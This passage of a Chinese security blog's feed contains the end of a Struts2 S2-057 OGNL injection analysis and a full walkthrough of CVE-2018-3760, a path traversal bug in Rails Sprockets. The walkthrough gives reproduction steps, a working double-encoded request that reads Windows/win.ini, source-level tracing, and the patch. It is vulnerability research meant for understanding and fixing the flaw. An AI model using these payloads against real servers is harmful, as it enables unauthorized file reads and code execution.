<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180823142552-627a9546-a69d-1.png" alt="16.png"><br>经过<code>result = createResult()</code>，跟入定位到<code>postback</code>这个result对象的处理方法，在 org/apache/struts2/result/PostbackResult.java:113<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@Override</span></div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">execute</span><span class="params">(ActionInvocation invocation)</span> <span class="keyword">throws</span> Exception </span>&#123;</div><div class="line">    String postbackUri = makePostbackUri(invocation);</div><div class="line">    setLocation(postbackUri);</div><div class="line">    <span class="keyword">super</span>.execute(invocation);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>跟入<code>makePostbackUri1</code>，在org/apache/struts2/result/PostbackResult.java:129<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">protected</span> String <span class="title">makePostbackUri</span><span class="params">(ActionInvocation invocation)</span> </span>&#123;</div><div class="line">    ActionContext ctx = invocation.getInvocationContext();</div><div class="line">    HttpServletRequest request = (HttpServletRequest) ctx.get(ServletActionContext.HTTP_REQUEST);</div><div class="line">    String postbackUri;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (actionName != <span class="keyword">null</span>) &#123;</div><div class="line">        actionName = conditionalParse(actionName, invocation);</div><div class="line">        <span class="keyword">if</span> (namespace == <span class="keyword">null</span>) &#123;</div><div class="line">            namespace = invocation.getProxy().getNamespace();</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            namespace = conditionalParse(namespace, invocation);</div><div class="line">        &#125;</div><div class="line">        ...</div><div class="line">        postbackUri = request.getContextPath() + actionMapper.getUriFromActionMapping(<span class="keyword">new</span> ActionMapping(actionName, namespace, method, <span class="keyword">null</span>));</div><div class="line">    &#125;</div><div class="line">    ...</div><div class="line"></div><div class="line">    <span class="keyword">return</span> postbackUri;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180823142552-62a0f9e8-a69d-1.png" alt="12.png"></p>
<p>获取到<code>namespace</code>值为<code>/${(111+111)}</code>。跟入<code>actionMapper.getUriFromActionMapping(new ActionMapping(actionName, namespace, method, null))</code>，其具体执行过程如攻击点一[Redirect action]提到的那样，设置namespace等参数，然后从<code>getUriFromActionMapping</code>中返回uri。最后组装的postbackUri为<code>/${(111+111)}/register2.action</code></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180823142553-62bd3748-a69d-1.png" alt="13.png"></p>
<p>回到前面的<code>execute</code>中通过<code>setLocation(postbackUri)</code>设置了location变量：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180823142553-62d8fff0-a69d-1.png" alt="14.png"></p>
<p>此后location变量传入，造成OGNL表达式注入</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180823142553-62f34194-a69d-1.png" alt="15.png"></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="https://struts.apache.org/core-developers/namespace-configuration.html" target="_blank" rel="external">https://struts.apache.org/core-developers/namespace-configuration.html</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/2618&quot;&gt;【Struts2-代码执行漏洞分析系列】S2-057&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
    
    
      <category term="代码执行" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
    
      <category term="命令执行" scheme="http://chybeta.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
      <category term="struts2" scheme="http://chybeta.github.io/tags/struts2/"/>
    
      <category term="s2" scheme="http://chybeta.github.io/tags/s2/"/>
    
  </entry>
  
  <entry>
    <title>Ruby on Rails 路径穿越与任意文件读取漏洞分析 -【CVE-2018-3760】</title>
    <link href="http://chybeta.github.io/2018/08/20/Ruby-on-Rails-%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E4%B8%8E%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E3%80%90CVE-2018-3760%E3%80%91/"/>
    <id>http://chybeta.github.io/2018/08/20/Ruby-on-Rails-路径穿越与任意文件读取漏洞分析-【CVE-2018-3760】/</id>
    <published>2018-08-20T08:33:19.000Z</published>
    <updated>2018-08-20T08:35:01.842Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://xz.aliyun.com/t/2542" target="_blank" rel="external">Ruby on Rails 路径穿越与任意文件读取漏洞分析 -【CVE-2018-3760】</a><br><a id="more"></a></p>
<h1 id="漏洞公告"><a href="#漏洞公告" class="headerlink" title="漏洞公告"></a>漏洞公告</h1><p>该漏洞由安全研究人员 <a href="https://twitter.com/orange_8361" target="_blank" rel="external">Orange Tsai</a>发现。漏洞公告来自  <a href="https://groups.google.com/forum/#!topic/rubyonrails-security/ft_J--l55fM" target="_blank" rel="external">https://groups.google.com/forum/#!topic/rubyonrails-security/ft_J--l55fM</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">There is an information leak vulnerability in Sprockets. This vulnerability</div><div class="line">has been assigned the CVE identifier CVE-2018-3760.</div><div class="line"></div><div class="line">Versions Affected: 4.0.0.beta7 and lower, 3.7.1 and lower, 2.12.4 and lower.</div><div class="line">Not affected: NONE</div><div class="line">Fixed Versions: 4.0.0.beta8, 3.7.2, 2.12.5</div><div class="line"></div><div class="line">Impact</div><div class="line">------</div><div class="line">Specially crafted requests can be used to access files that exists on</div><div class="line">the filesystem that is outside an application&apos;s root directory, when the Sprockets server is</div><div class="line">used in production.</div><div class="line"></div><div class="line">All users running an affected release should either upgrade or use one of the work arounds immediately.</div></pre></td></tr></table></figure></p>
<p>影响面： development servers，且开启了 <code>config.assets.compile</code></p>
<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>本地安装好ruby和rails。以ruby 2.4.4 ，rails v5.0.7为例：<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ gem install rails -v <span class="number">5.0</span>.<span class="number">7</span></div><div class="line">$ rails new blog &amp;&amp; cd blog</div></pre></td></tr></table></figure></p>
<p>此时blog这个rails项目使用的sprockets版本是3.7.2（fixed）。修改blog目录下的Gemfile.lock第122行：<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sprockets (<span class="number">3.7</span>.<span class="number">1</span>)</div></pre></td></tr></table></figure></p>
<p>修改配置文件 <code>config/environments/production.rb</code>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">config.assets.compile = true</div></pre></td></tr></table></figure></p>
<p>在blog目录下执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">$ bundle install</div><div class="line">$ rails server                                     </div><div class="line">    * Min threads: 5, max threads: 5                           </div><div class="line">    * Environment: development                                 </div><div class="line">    * Listening on tcp://0.0.0.0:3000                          </div><div class="line">    Use Ctrl-C to stop</div></pre></td></tr></table></figure></p>
<p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">GET /assets/file:%2f%2f//C:/chybeta/blog/app/assets/config/%252e%252e%2f%252e%2e%2f%252e%2e%2f%252e%2e%2f%252e%2e%2f%252e%2e%2f%252e%2e%2fWindows/win.ini</div></pre></td></tr></table></figure></p>
<p>win平台：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180808122707-4f3b27b0-9ac3-1.png" alt="win.png"></p>
<p>linux平台</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180808122707-4f6242e6-9ac3-1.png" alt="linux.png"></p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>注：为明白起见，许多分析直接写在代码注释部分，请留意。</p>
<p>问题出在<code>sprockets</code>，它用来检查 JavaScript 文件的相互依赖关系，用以优化网页中引入的js文件，以避免加载不必要的js文件。当访问如<code>http://127.0.0.1:3000/assets/foo.js</code>时，会进入server.rb:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">call</span><span class="params">(env)</span></span></div><div class="line">    start_time = Time.now.to_f</div><div class="line">    time_elapsed = lambda &#123; ((Time.now.to_f - start_time) * <span class="number">1000</span>).to_i &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> ![<span class="string">'GET'</span>, <span class="string">'HEAD'</span>].<span class="keyword">include</span>?(env[<span class="string">'REQUEST_METHOD'</span>])</div><div class="line">    <span class="keyword">return</span> method_not_allowed_response</div><div class="line">    <span class="keyword">end</span></div><div class="line"></div><div class="line">    msg = <span class="string">"Served asset <span class="subst">#&#123;env[<span class="string">'PATH_INFO'</span>]&#125;</span> -"</span></div><div class="line"></div><div class="line">    <span class="comment"># Extract the path from everything after the leading slash</span></div><div class="line">    path = Rack::Utils.unescape(env[<span class="string">'PATH_INFO'</span>].to_s.sub(<span class="regexp">/^\//</span>, <span class="string">''</span>))</div><div class="line"></div><div class="line">    <span class="comment"># Strip fingerprint</span></div><div class="line">    <span class="keyword">if</span> fingerprint = path_fingerprint(path)</div><div class="line">      path = path.sub(<span class="string">"-<span class="subst">#&#123;fingerprint&#125;</span>"</span>, <span class="string">''</span>)</div><div class="line">    <span class="keyword">end</span></div><div class="line">    <span class="comment"># 此时path值为 file:///C:/chybeta/blog/app/assets/config/%2e%2e/%2e./%2e./%2e./%2e./%2e./%2e./Windows/win.ini</span></div><div class="line"></div><div class="line">    <span class="comment"># URLs containing a `".."` are rejected for security reasons.</span></div><div class="line">    <span class="keyword">if</span> forbidden_request?(path)</div><div class="line">        <span class="keyword">return</span> forbidden_response(env)</div><div class="line">    <span class="keyword">end</span></div><div class="line"></div><div class="line">    ...</div><div class="line"></div><div class="line">    asset = find_asset(path, options)</div><div class="line">    ...</div></pre></td></tr></table></figure></p>
<p><code>forbidden_request</code>用来对path进行检查，是否包含<code>..</code>以防止路径穿越，是否是绝对路径：<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">private</div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forbidden_request?</span><span class="params">(path)</span></span></div><div class="line">    <span class="comment"># Prevent access to files elsewhere on the file system</span></div><div class="line">    <span class="comment">#</span></div><div class="line">    <span class="comment">#     http://example.org/assets/../../../etc/passwd</span></div><div class="line">    <span class="comment">#</span></div><div class="line">    path.<span class="keyword">include</span>?(<span class="string">".."</span>) <span class="params">||</span> absolute_path?(path)</div><div class="line"><span class="keyword">end</span></div></pre></td></tr></table></figure></p>
<p>如果请求中包含<code>..</code>即返回真，然后返回forbidden_response(env)信息。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180808122707-4f7cf082-9ac3-1.png" alt="4.png"></p>
<p>回到call函数，进入<code>find_asset(path, options)</code>，在 lib/ruby/gems/2.4.0/gems/sprockets-3.7.1/lib/sprockets/base.rb:63:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># Find asset by logical path or expanded path.</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_asset</span><span class="params">(path, options = &#123;&#125;)</span></span></div><div class="line">    uri, <span class="number">_</span> = resolve(path, options.merge(<span class="symbol">compat:</span> <span class="literal">false</span>))</div><div class="line">    <span class="keyword">if</span> uri</div><div class="line">        <span class="comment"># 解析出来的 uri 值为 file:///C:/chybeta/blog/app/assets/config/%2e%2e/%2e./%2e./%2e./%2e./%2e./%2e./Windows/win.ini</span></div><div class="line">        load(uri)</div><div class="line">    <span class="keyword">end</span></div><div class="line"><span class="keyword">end</span></div></pre></td></tr></table></figure></p>
<p>跟进<code>load</code>，在 lib/ruby/gems/2.4.0/gems/sprockets-3.7.1/lib/sprockets/loader.rb:32 。以请求<code>GET /assets/file:%2f%2f//C:/chybeta/blog/app/assets/config/%252e%252e%2f%252e%2e%2f%252e%2e%2f%252e%2e%2f%252e%2e%2f%252e%2e%2f%252e%2e%2fWindows/win.ini</code>为例，其一步步的解析过程见下注释：<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">load</span><span class="params">(uri)</span></span></div><div class="line">    <span class="comment"># 此时 uri 已经经过了一次的url解码 </span></div><div class="line">    <span class="comment"># 其值为  file:///C:/chybeta/blog/app/assets/config/%2e%2e/%2e./%2e./%2e./%2e./%2e./%2e./Windows/win.ini</span></div><div class="line">    unloaded = UnloadedAsset.new(uri, <span class="keyword">self</span>)</div><div class="line">    <span class="keyword">if</span> unloaded.params.key?(<span class="symbol">:id</span>)</div><div class="line">        ...</div><div class="line">    <span class="keyword">else</span></div><div class="line">        asset = fetch_asset_from_dependency_cache(unloaded) <span class="keyword">do</span> <span class="params">|paths|</span></div><div class="line">        <span class="comment"># When asset is previously generated, its "dependencies" are stored in the cache.</span></div><div class="line">        <span class="comment"># The presence of `paths` indicates dependencies were stored.</span></div><div class="line">        <span class="comment"># We can check to see if the dependencies have not changed by "resolving" them and</span></div><div class="line">        <span class="comment"># generating a digest key from the resolved entries. If this digest key has not</span></div><div class="line">        <span class="comment"># changed the asset will be pulled from cache.</span></div><div class="line">        <span class="comment">#</span></div><div class="line">        <span class="comment"># If this `paths` is present but the cache returns nothing then `fetch_asset_from_dependency_cache`</span></div><div class="line">        <span class="comment"># will confusingly be called again with `paths` set to nil where the asset will be</span></div><div class="line">        <span class="comment"># loaded from disk.</span></div><div class="line"></div><div class="line">        <span class="comment"># 当存在缓存时</span></div><div class="line">        <span class="keyword">if</span> paths</div><div class="line">            load_from_unloaded(unloaded)</div><div class="line">            digest = DigestUtils.digest(resolve_dependencies(paths))</div><div class="line">            <span class="keyword">if</span> uri_from_cache = cache.get(unloaded.digest_key(digest), <span class="literal">true</span>)</div><div class="line">                asset_from_cache(UnloadedAsset.new(uri_from_cache, <span class="keyword">self</span>).asset_key)</div><div class="line">        <span class="keyword">end</span></div><div class="line">        <span class="keyword">else</span></div><div class="line">        <span class="comment"># 当缓存不存在，主要考虑这个</span></div><div class="line">            load_from_unloaded(unloaded)</div><div class="line">        <span class="keyword">end</span></div><div class="line">    <span class="keyword">end</span></div><div class="line">    <span class="keyword">end</span></div><div class="line">    Asset.new(<span class="keyword">self</span>, asset)</div><div class="line"><span class="keyword">end</span></div></pre></td></tr></table></figure></p>
<p>跟入<code>UnloadedAsset.new</code><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">UnloadedAsset</span></span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">initialize</span><span class="params">(uri, env)</span></span></div><div class="line">      @uri               = uri.to_s</div><div class="line">      @env               = env</div><div class="line">      @compressed_path   = URITar.new(uri, env).compressed_path</div><div class="line">      @params            = <span class="literal">nil</span> <span class="comment"># lazy loaded</span></div><div class="line">      @filename          = <span class="literal">nil</span> <span class="comment"># lazy loaded 具体实现见下面</span></div><div class="line">    <span class="keyword">end</span></div><div class="line">    ...</div><div class="line">    <span class="comment"># Internal: Full file path without schema</span></div><div class="line">    <span class="comment">#</span></div><div class="line">    <span class="comment"># This returns a string containing the full path to the asset without the schema.</span></div><div class="line">    <span class="comment"># Information is loaded lazilly since we want `UnloadedAsset.new(dep, self).relative_path`</span></div><div class="line">    <span class="comment"># to be fast. Calling this method the first time allocates an array and a hash.</span></div><div class="line">    <span class="comment">#</span></div><div class="line">    <span class="comment"># Example</span></div><div class="line">    <span class="comment">#</span></div><div class="line">    <span class="comment"># If the URI is `file:///Full/path/app/assets/javascripts/application.js"` then the</span></div><div class="line">    <span class="comment"># filename would be `"/Full/path/app/assets/javascripts/application.js"`</span></div><div class="line">    <span class="comment">#</span></div><div class="line">    <span class="comment"># Returns a String.</span></div><div class="line"></div><div class="line">    <span class="comment"># 由于采用了Lazy loaded，当第一次访问到filename这个属性时，会调用下面这个方法</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">filename</span></span></div><div class="line">      unless @filename</div><div class="line">        load_file_params <span class="comment"># 跟进去，见下</span></div><div class="line">      <span class="keyword">end</span></div><div class="line">      @filename</div><div class="line">    <span class="keyword">end</span></div><div class="line">    ...</div><div class="line">    <span class="comment"># 第 130 行</span></div><div class="line">    private</div><div class="line">    <span class="comment"># Internal: Parses uri into filename and params hash</span></div><div class="line">    <span class="comment">#</span></div><div class="line">    <span class="comment"># Returns Array with filename and params hash</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">load_file_params</span></span></div><div class="line">        <span class="comment"># uri 为  file:///C:/chybeta/blog/app/assets/config/%2e%2e/%2e./%2e./%2e./%2e./%2e./%2e./Windows/win.ini</span></div><div class="line">        @filename, @params = URIUtils.parse_asset_uri(uri)</div><div class="line">    <span class="keyword">end</span></div></pre></td></tr></table></figure></p>
<p>跟入<code>URIUtils.parse_asset_uri</code><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_asset_uri</span><span class="params">(uri)</span></span></div><div class="line">    <span class="comment"># uri 为  file:///C:/chybeta/blog/app/assets/config/%2e%2e/%2e./%2e./%2e./%2e./%2e./%2e./Windows/win.ini</span></div><div class="line">    <span class="comment"># 跟进 split_file_uri</span></div><div class="line">    scheme, <span class="number">_</span>, path, query = split_file_uri(uri)</div><div class="line">    ...</div><div class="line">    <span class="keyword">return</span> path, parse_uri_query_params(query)</div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line">...<span class="comment"># 省略</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">split_file_uri</span><span class="params">(uri)</span></span></div><div class="line">    scheme, <span class="number">_</span>, host, <span class="number">_</span>, <span class="number">_</span>, path, <span class="number">_</span>, query, <span class="number">_</span> = URI.split(uri)</div><div class="line">    <span class="comment"># 此时解析出的几个变量如下： </span></div><div class="line">    <span class="comment"># scheme: file</span></div><div class="line">    <span class="comment"># host: </span></div><div class="line">    <span class="comment"># path: /C:/chybeta/blog/app/assets/config/%2e%2e/%2e./%2e./%2e./%2e./%2e./%2e./Windows/win.ini</span></div><div class="line">    <span class="comment"># query:  </span></div><div class="line">    path = URI::Generic::DEFAULT_PARSER.unescape(path)</div><div class="line">    <span class="comment"># 这里经过第二次的url解码</span></div><div class="line">    <span class="comment"># path：/C:/chybeta/blog/app/assets/config/../../../../../../../Windows/win.ini</span></div><div class="line">    path.force_encoding(Encoding::UTF_8)</div><div class="line"></div><div class="line">    <span class="comment"># Hack for parsing Windows "file:///C:/Users/IEUser" paths</span></div><div class="line">    path.gsub!(<span class="regexp">/^\/([a-zA-Z]:)/</span>, <span class="string">'\1'</span>.freeze)</div><div class="line">    <span class="comment"># path: C:/chybeta/blog/app/assets/config/../../../../../../../Windows/win.ini</span></div><div class="line">    [scheme, host, path, query]</div><div class="line"><span class="keyword">end</span></div><div class="line"><span class="string">``</span><span class="string">`    </span></div><div class="line"></div><div class="line"></div><div class="line">![5.png](https://xzfile.aliyuncs.com/media/upload/picture/20180808122707-4f8e0bce-9ac3-1.png)</div><div class="line"></div><div class="line"></div><div class="line">在完成了filename解析后，我们回到`load<span class="string">`函数末尾，进入`</span>load_from_unloaded(unloaded)<span class="string">`:</span></div><div class="line">`<span class="string">``</span>ruby</div><div class="line">    <span class="comment"># Internal: Loads an asset and saves it to cache</span></div><div class="line">    <span class="comment">#</span></div><div class="line">    <span class="comment"># unloaded - An UnloadedAsset</span></div><div class="line">    <span class="comment">#</span></div><div class="line">    <span class="comment"># This method is only called when the given unloaded asset could not be</span></div><div class="line">    <span class="comment"># successfully pulled from cache.</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">load_from_unloaded</span><span class="params">(unloaded)</span></span></div><div class="line">        unless file?(unloaded.filename)</div><div class="line">            raise FileNotFound, <span class="string">"could not find file: <span class="subst">#&#123;unloaded.filename&#125;</span>"</span></div><div class="line">        <span class="keyword">end</span></div><div class="line"></div><div class="line">        load_path, logical_path = paths_split(config[<span class="symbol">:paths</span>], unloaded.filename)</div><div class="line">        unless load_path</div><div class="line">            raise FileOutsidePaths, <span class="string">"<span class="subst">#&#123;unloaded.filename&#125;</span> is no longer under a load path: <span class="subst">#&#123;<span class="keyword">self</span>.paths.join(<span class="string">', '</span>)&#125;</span>"</span></div><div class="line">        <span class="keyword">end</span></div><div class="line">        ....</div></pre></td></tr></table></figure></p>
<p>主要是进行了两个检查：文件是否存在和是否在合规目录里。主要关注第二个检测。其中<code>config[:paths]</code>是允许的路径，而<code>unloaded.filename</code>是请求的路径文件名。跟入 lib/ruby/gems/2.4.0/gems/sprockets-3.7.2/lib/sprockets/path_utils.rb:120：<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># Internal: Detect root path and base for file in a set of paths.</span></div><div class="line"><span class="comment">#</span></div><div class="line"><span class="comment"># paths    - Array of String paths</span></div><div class="line"><span class="comment"># filename - String path of file expected to be in one of the paths.</span></div><div class="line"><span class="comment">#</span></div><div class="line"><span class="comment"># Returns [String root, String path]</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">paths_split</span><span class="params">(paths, filename)</span></span></div><div class="line">    <span class="comment"># 对paths中的每一个 path</span></div><div class="line">    paths.each <span class="keyword">do</span> <span class="params">|path|</span></div><div class="line">    <span class="comment"># 如果subpath不为空</span></div><div class="line">        <span class="keyword">if</span> subpath = split_subpath(path, filename)</div><div class="line">            <span class="comment"># 则返回 path, subpath</span></div><div class="line">            <span class="keyword">return</span> path, subpath</div><div class="line">        <span class="keyword">end</span></div><div class="line">    <span class="keyword">end</span></div><div class="line">    <span class="literal">nil</span></div><div class="line"><span class="keyword">end</span></div></pre></td></tr></table></figure></p>
<p>继续跟入<code>split_subpath</code>， lib/ruby/gems/2.4.0/gems/sprockets-3.7.2/lib/sprockets/path_utils.rb:103。假设上面传入的path参数是``。<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># Internal: Get relative path for root path and subpath.</span></div><div class="line"> <span class="comment">#</span></div><div class="line"> <span class="comment"># path    - String path</span></div><div class="line"> <span class="comment"># subpath - String subpath of path</span></div><div class="line"> <span class="comment">#</span></div><div class="line"> <span class="comment"># Returns relative String path if subpath is a subpath of path, or nil if</span></div><div class="line"> <span class="comment"># subpath is outside of path.</span></div><div class="line"> <span class="function"><span class="keyword">def</span> <span class="title">split_subpath</span><span class="params">(path, subpath)</span></span></div><div class="line">   <span class="keyword">return</span> <span class="string">""</span> <span class="keyword">if</span> path == subpath</div><div class="line">   <span class="comment"># 此时 path 为 C:/chybeta/blog/app/assets/config/../../../../../../../Windows/win.ini</span></div><div class="line">   path = File.join(path, <span class="string">''</span>)</div><div class="line">   <span class="comment"># 此时 path 为 C:/chybeta/blog/app/assets/config/../../../../../../../Windows/win.ini/</span></div><div class="line">   <span class="comment"># 与传入的绝对路径进行比较</span></div><div class="line">   <span class="comment"># 如果以 允许的路径 为开头，则检查通过。</span></div><div class="line">   <span class="keyword">if</span> subpath.start_with?(path)</div><div class="line">     subpath[path.length..-<span class="number">1</span>]</div><div class="line">   <span class="keyword">else</span></div><div class="line">     <span class="literal">nil</span></div><div class="line">   <span class="keyword">end</span></div><div class="line"> <span class="keyword">end</span></div></pre></td></tr></table></figure></p>
<p>通过检查后，在<code>load_from_unloaded</code>末尾即进行了读取等操作，从而通过路径穿越造成任意文件读取。</p>
<p>如果文件以<code>.erb</code>结尾，则会直接执行：</p>
<h1 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a>补丁</h1><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180808122708-4fa451c2-9ac3-1.png" alt="buding.png"></p>
<p>在server.rb中，增加关键字过滤<code>://</code>。</p>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul>
<li><a href="https://github.com/rails/sprockets/commit/c09131cf5b2c479263939c8582e22b98ed616c5f" target="_blank" rel="external">https://github.com/rails/sprockets/commit/c09131cf5b2c479263939c8582e22b98ed616c5f</a></li>
<li><a href="https://blog.heroku.com/rails-asset-pipeline-vulnerability" target="_blank" rel="external">https://blog.heroku.com/rails-asset-pipeline-vulnerability</a></li>
<li><a href="https://twitter.com/orange_8361/status/1009309271698300928" target="_blank" rel="external">https://twitter.com/orange_8361/status/1009309271698300928</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
